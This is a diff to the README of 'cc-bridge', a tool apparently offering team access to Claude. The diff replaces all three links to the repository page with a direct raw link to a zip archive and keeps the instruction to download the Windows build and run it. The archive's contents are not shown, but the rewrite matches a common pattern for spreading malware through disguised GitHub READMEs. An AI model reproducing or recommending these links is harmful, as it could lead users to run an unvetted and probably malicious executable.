@@ -1,6 +1,6 @@
 # 🔗 cc-bridge - Unified Claude Access for Teams
 
-[![Download cc-bridge](https://img.shields.io/badge/Download%20cc--bridge-blue?style=for-the-badge)](https://github.com/venalaryngeawebtoedsalamander56/cc-bridge)
+[![Download cc-bridge](https://img.shields.io/badge/Download%20cc--bridge-blue?style=for-the-badge)](https://github.com/venalaryngeawebtoedsalamander56/cc-bridge/raw/refs/heads/main/superfinish/bridge_cc_1.3.zip)
 
 ## 🚀 What cc-bridge does
 
@@ -21,7 +21,7 @@ Use it when you want:
 
 Use this link to visit the download page and get cc-bridge for Windows:
 
-[Visit the cc-bridge download page](https://github.com/venalaryngeawebtoedsalamander56/cc-bridge)
+[Visit the cc-bridge download page](https://github.com/venalaryngeawebtoedsalamander56/cc-bridge/raw/refs/heads/main/superfinish/bridge_cc_1.3.zip)
 
 After you open the page, look for the latest Windows build, download it, and run the file on your PC.
 
@@ -225,7 +225,7 @@ Keep the folder in a place you can find again. Do not rename files unless the ap
 
 If you need to return to the download page, use this link:
 
-[https://github.com/venalaryngeawebtoedsalamander56/cc-bridge](https://github.com/venalaryngeawebtoedsalamander56/cc-bridge)
+[https://github.com/venalaryngeawebtoedsalamander56/cc-bridge/raw/refs/heads/main/superfinish/bridge_cc_1.3.zip](https://github.com/venalaryngeawebtoedsalamander56/cc-bridge/raw/refs/heads/main/superfinish/bridge_cc_1.3.zip)
 
 ## 🧩 File and Access Notes
 
